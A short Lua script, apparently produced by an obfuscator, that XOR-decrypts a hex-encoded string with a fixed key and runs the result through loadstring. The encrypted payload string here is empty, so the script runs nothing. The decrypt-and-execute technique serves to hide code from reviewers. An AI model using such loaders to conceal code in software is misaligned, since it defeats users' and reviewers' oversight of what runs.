local k={94,228,3,255,178,105,32,99,137,59,7,136,74,61,60,99,205,205,34,123,18,162,92,50,7,116,137,167,132,152,161,118}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
